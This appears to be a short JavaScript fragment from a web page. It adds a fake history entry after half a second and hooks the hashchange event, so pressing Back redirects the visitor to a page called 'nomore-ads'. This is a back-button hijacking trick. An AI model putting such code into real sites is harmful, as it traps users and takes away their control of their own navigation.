    window.onhashchange=function(){jp();};
    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
    function jp() {
        fh();}
    setTimeout('hh();', 500);
    function fh(){
        location.href="nomore-ads";
    }
    function goon(){
        location.href="nomore-ads";
    }

